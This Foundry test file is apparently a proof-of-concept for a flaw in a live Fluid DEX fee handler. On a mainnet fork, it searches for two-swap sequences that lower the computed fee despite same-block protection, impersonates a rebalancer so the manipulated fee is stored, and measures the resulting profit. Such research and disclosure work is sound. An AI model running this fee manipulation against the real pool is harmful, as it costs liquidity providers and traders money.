// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test} from "forge-std/Test.sol";

interface IERC20FeeProbe {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFluidDexFeeProbe {
    struct Implementations {
        address shift;
        address admin;
        address colOperations;
        address debtOperations;
        address perfectOperationsAndSwapOut;
    }

    struct ConstantViews {
        uint256 dexId;
        address liquidity;
        address factory;
        Implementations implementations;
        address deployerContract;
        address token0;
        address token1;
        bytes32 supplyToken0Slot;
        bytes32 borrowToken0Slot;
        bytes32 supplyToken1Slot;
        bytes32 borrowToken1Slot;
        bytes32 exchangePriceToken0Slot;
        bytes32 exchangePriceToken1Slot;
        uint256 oracleMapping;
    }

    function constantsView() external view returns (ConstantViews memory);
    function swapIn(bool swap0to1, uint256 amountIn, uint256 amountOutMin, address to)
        external payable returns (uint256 amountOut);
}

interface IDexFeeHandlerProbe {
    function currentConfig() external view returns (uint256);
    function newConfig() external view returns (uint256);
    function getDexVariables()
        external view returns (uint256 lastToLastPrice, uint256 lastPrice, uint256 timestamp);
    function rebalance() external;
}

interface IReserveFeeProbe {
    function isRebalancer(address user) external view returns (bool);
}

contract DexFeeHandlerTwoSwapBypassTest is Test {
    address internal constant DEX = 0xf063BD202E45d6b2843102cb4EcE339026645D4a;
    address internal constant HANDLER = 0x49EF1B3230a8d2AC7205E808dF5859f1b94D61Df;
    address internal constant RESERVE = 0x264786EF916af64a1DB19F513F24a3681734ce92;
    // Observed successfully calling rebalance() on the live wstETH/ETH fee handler.
    address internal constant REBALANCER = 0xb287f8A01a9538656c72Fa6aE1EE0117A187Be0C;
    address internal constant USDE = 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 internal constant START_USDE = 2_000_000e18;
    uint256 internal constant START_USDT = 2_000_000e6;

    bool internal bestFirstDirection;
    bool internal bestSecondDirection;
    uint256 internal bestFirstAmount;
    uint256 internal bestSecondAmount;
    uint256 internal bestFee = type(uint256).max;

    event Candidate(
        bool firstDirection,
        uint256 firstAmount,
        bool secondDirection,
        uint256 secondAmount,
        uint256 lastToLastPrice,
        uint256 lastPrice,
        uint256 calculatedFee
    );

    event BestCandidate(
        bool firstDirection,
        uint256 firstAmount,
        bool secondDirection,
        uint256 secondAmount,
        uint256 calculatedFee
    );

    event ClosedCycle(
        bool manipulated,
        uint256 configuredFee,
        uint256 startParityValue,
        uint256 endParityValue,
        int256 parityPnl,
        uint256 gasUsed
    );

    event BypassSummary(
        uint256 honestSameBlockFee,
        uint256 manipulatedSameBlockFee,
        uint256 feeBefore,
        uint256 feeAfter,
        int256 manipulatedCyclePnl,
        int256 baselineCyclePnl,
        int256 pnlImprovement
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), vm.envUint("MAINNET_FORK_BLOCK"));
        assertEq(block.chainid, 1, "unexpected chain");
        assertTrue(IReserveFeeProbe(RESERVE).isRebalancer(REBALANCER), "candidate is not rebalancer");

        IFluidDexFeeProbe.ConstantViews memory c = IFluidDexFeeProbe(DEX).constantsView();
        assertEq(c.token0, USDE, "unexpected token0");
        assertEq(c.token1, USDT, "unexpected token1");

        deal(USDE, address(this), START_USDE);
        deal(USDT, address(this), START_USDT);
        require(IERC20FeeProbe(USDE).approve(DEX, type(uint256).max), "USDE approve");
        require(IERC20FeeProbe(USDT).approve(DEX, type(uint256).max), "USDT approve");
    }

    function _parityValue() internal view returns (uint256) {
        return IERC20FeeProbe(USDE).balanceOf(address(this)) / 1e12
            + IERC20FeeProbe(USDT).balanceOf(address(this));
    }

    function _firstAmount(uint256 i, bool direction) internal pure returns (uint256) {
        uint256[9] memory whole = [
            uint256(1), 10, 100, 1_000, 5_000, 10_000, 25_000, 50_000, 100_000
        ];
        return whole[i] * (direction ? 1e18 : 1e6);
    }

    function _secondAmount(uint256 i, bool direction) internal pure returns (uint256) {
        if (direction) {
            uint256[5] memory amounts = [uint256(1e12), 1e14, 1e16, 1e17, 1e18];
            return amounts[i];
        }
        uint256[5] memory amounts = [uint256(1), 10, 1_000, 100_000, 1_000_000];
        return amounts[i];
    }

    function runTwoSwaps(
        bool firstDirection,
        uint256 firstAmount,
        bool secondDirection,
        uint256 secondAmount
    ) external returns (uint256 calculatedFee, uint256 lastToLastPrice, uint256 lastPrice) {
        require(msg.sender == address(this), "self only");
        IFluidDexFeeProbe(DEX).swapIn(firstDirection, firstAmount, 0, address(this));
        IFluidDexFeeProbe(DEX).swapIn(secondDirection, secondAmount, 0, address(this));
        (lastToLastPrice, lastPrice,) = IDexFeeHandlerProbe(HANDLER).getDexVariables();
        calculatedFee = IDexFeeHandlerProbe(HANDLER).newConfig();
    }

    function _searchBest() internal {
        for (uint256 d1; d1 < 2; ++d1) {
            bool direction1 = d1 == 0;
            for (uint256 a1; a1 < 9; ++a1) {
                uint256 firstAmount = _firstAmount(a1, direction1);
                for (uint256 d2; d2 < 2; ++d2) {
                    bool direction2 = d2 == 0;
                    for (uint256 a2; a2 < 5; ++a2) {
                        uint256 secondAmount = _secondAmount(a2, direction2);
                        uint256 snapshot = vm.snapshot();
                        try this.runTwoSwaps(direction1, firstAmount, direction2, secondAmount)
                            returns (uint256 fee, uint256 lastToLastPrice, uint256 lastPrice)
                        {
                            emit Candidate(
                                direction1,
                                firstAmount,
                                direction2,
                                secondAmount,
                                lastToLastPrice,
                                lastPrice,
                                fee
                            );
                            vm.revertTo(snapshot);
                            if (fee < bestFee) {
                                bestFee = fee;
                                bestFirstDirection = direction1;
                                bestSecondDirection = direction2;
                                bestFirstAmount = firstAmount;
                                bestSecondAmount = secondAmount;
                                emit BestCandidate(
                                    direction1,
                                    firstAmount,
                                    direction2,
                                    secondAmount,
                                    fee
                                );
                            }
                        } catch {
                            vm.revertTo(snapshot);
                        }
                    }
                }
            }
        }
        assertLt(bestFee, type(uint256).max, "no candidate");
    }

    function _closeInventory() internal {
        uint256 usde = IERC20FeeProbe(USDE).balanceOf(address(this));
        uint256 usdt = IERC20FeeProbe(USDT).balanceOf(address(this));

        if (usde < START_USDE && usdt > START_USDT) {
            IFluidDexFeeProbe(DEX).swapIn(false, usdt - START_USDT, 0, address(this));
        } else if (usdt < START_USDT && usde > START_USDE) {
            IFluidDexFeeProbe(DEX).swapIn(true, usde - START_USDE, 0, address(this));
        }
    }

    function _executeCycle(bool manipulateFee)
        internal returns (int256 pnl, uint256 configuredFee, uint256 gasUsed)
    {
        uint256 startValue = _parityValue();
        uint256 gasBefore = gasleft();

        IFluidDexFeeProbe(DEX).swapIn(bestFirstDirection, bestFirstAmount, 0, address(this));
        IFluidDexFeeProbe(DEX).swapIn(bestSecondDirection, bestSecondAmount, 0, address(this));

        if (manipulateFee) {
            vm.prank(REBALANCER);
            IDexFeeHandlerProbe(HANDLER).rebalance();
        }
        configuredFee = IDexFeeHandlerProbe(HANDLER).currentConfig();
        _closeInventory();

        gasUsed = gasBefore - gasleft();
        uint256 endValue = _parityValue();
        pnl = int256(endValue) - int256(startValue);
        emit ClosedCycle(manipulateFee, configuredFee, startValue, endValue, pnl, gasUsed);
    }

    function test_twoSwapsBypassSameBlockProtection_andQuantifyClosedCycle() public {
        uint256 feeBefore = IDexFeeHandlerProbe(HANDLER).currentConfig();
        uint256 honestSameBlockFee = IDexFeeHandlerProbe(HANDLER).newConfig();
        _searchBest();

        uint256 baselineSnapshot = vm.snapshot();
        (int256 baselinePnl,,) = _executeCycle(false);
        vm.revertTo(baselineSnapshot);

        (int256 manipulatedPnl, uint256 feeAfter,) = _executeCycle(true);

        emit BypassSummary(
            honestSameBlockFee,
            bestFee,
            feeBefore,
            feeAfter,
            manipulatedPnl,
            baselinePnl,
            manipulatedPnl - baselinePnl
        );

        assertLt(bestFee, honestSameBlockFee, "two swaps did not lower fee");
        assertEq(feeAfter, bestFee, "handler did not persist manipulated fee");
    }
}
